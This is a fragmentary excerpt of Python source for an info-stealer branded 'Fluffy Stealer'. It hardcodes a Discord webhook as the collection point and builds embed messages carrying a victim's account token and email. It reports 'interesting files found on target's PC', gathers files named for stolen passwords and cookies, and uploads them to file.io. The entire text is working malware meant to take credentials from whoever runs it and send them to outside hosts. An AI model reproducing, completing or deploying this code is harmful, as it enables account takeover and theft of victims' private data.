...
hook = "https://discord.com/api/webhooks/1497902213027336304/2OUe2P7aCvm00IdIABXV1ZSp1_75qMaS6aBbZQBzW2-PocN8xNSLJ5fzeX9ui-AcyB8o"
DETECTED = False
...
def uploadToken(token, path):
    ...
    if pfp == None:
        pfp = "https://i.pinimg.com/736x/1f/06/a5/1f06a5469b02d44ac46158d8f930f365.jpg"
    else:
    ...
    data = {
        ...
        "embeds": [
            ...
            "fields": [
                {
                    "name": ":rocket: Token:",
                    "value": f"`{token}`\n[Click to copy](https://example.com/copy/{token})"
                },
                {
                    "name": ":envelope: Email:",
                    "value": f"`{email}`",
            ...
            "footer": {
                "text": "Fluffy Stealer",
                "icon_url": "https://i.pinimg.com/736x/1f/06/a5/1f06a5469b02d44ac46158d8f930f365.jpg"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
        ...
        "avatar_url": "https://i.pinimg.com/736x/1f/06/a5/1f06a5469b02d44ac46158d8f930f365.jpg",
        "username": "Improved Stealer",
        "attachments": []
        }
...
def upload(name, tk=''):
    ...
    if name == "kiwi":
        ...
        "embeds": [
            ...
            "fields": [
                {
                "name": "Interesting files found on target's PC:",
                "value": tk
                }
            ],
            "author": {
    ...
    for file in ["wppassw.txt", "wpcook.txt"]:
        ...
        def uploadToAnonfiles(path):
            try:
                ...
                upload = requests.post("https://file.io", files=files)
